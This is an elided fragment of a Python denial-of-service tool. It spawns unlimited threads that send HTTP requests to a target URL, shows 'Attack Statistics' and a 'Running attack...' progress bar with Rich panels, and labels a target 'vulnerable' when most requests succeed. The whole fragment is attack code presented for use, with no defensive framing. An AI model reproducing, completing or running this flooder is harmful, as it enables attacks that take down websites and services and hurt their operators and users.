...
def send_request(url, thread_id, stats, progress):
    ...
    try:
        ...
        status_panel = Panel(f'[bold white]Response:[/] [cyan]{response.status_code}[/]\n[bold white]Time:[/] [blue]{response_time:.3f}s[/]', title=f'[bold green]Thread #{thread_id:03d}[/]', border_style='bright_yellow', padding=(0, 1))
        progress.console.print(status_panel)
    except requests.exceptions.Timeout:
        stats.timeouts += 1
        error_panel = Panel('[bold yellow]REQUEST TIMEOUT[/]', title=f'[bold red]Thread #{thread_id:03d}[/]', border_style='red', padding=(0, 1))
        progress.console.print(error_panel)
        return
    except requests.exceptions.ConnectionError:
        stats.failed_connections += 1
        error_panel = Panel('[bold red]CONNECTION FAILED[/]', title=f'[bold red]Thread #{thread_id:03d}[/]', border_style='red', padding=(0, 1))
        progress.console.print(error_panel)
        return
    except Exception as e:
        stats.other_errors += 1
        error_panel = Panel(f'[bold red]ERROR: {str(e)}[/]', title=f'[bold red]Thread #{thread_id:03d}[/]', border_style='red', padding=(0, 1))
        progress.console.print(error_panel)
        return None
...
def create_results_display(stats):
    ...
    layout = Layout()
    layout.split_row(Panel(main_stats, title='[bold red]Attack Statistics[/]', border_style='bright_yellow', padding=(1, 2)), Panel(perf_stats, title='[bold red]Performance Metrics[/]', border_style='bright_yellow', padding=(1, 2)))
    return layout
...
def main():
    ...
    try:
        ...
        console.print(Panel(attack_config, title='[bold red]Attack Configuration[/]', border_style='bright_yellow', padding=(1, 2)))
        stats = Stats()
        signal.signal(signal.SIGINT, signal_handler)
        with Progress(SpinnerColumn(), TextColumn('[bold cyan]Running attack...[/]'), BarColumn(pulse_style='red'), TimeRemainingColumn(), console=console) as progress:
            try:
                thread_id = 1
                while stats.active:
                    thread = threading.Thread(target=send_request, args=(url, thread_id, stats, progress))
                    thread.daemon = True
                    thread.start()
                    thread_id += 1
                    time.sleep(delay)
                ...
                if stats.total_requests > 0:
                    vulnerability = 'Target appears to be [bold green]vulnerable[/]!' if stats.successful_requests / stats.total_requests > 0.8 else 'Target appears to be [bold yellow]resistant[/] to the attack.'
                    console.print(Panel(vulnerability, title='[bold red]Analysis Result[/]', border_style='bright_yellow', padding=(1, 2)))
        delay = 0.1
        stats.active = False
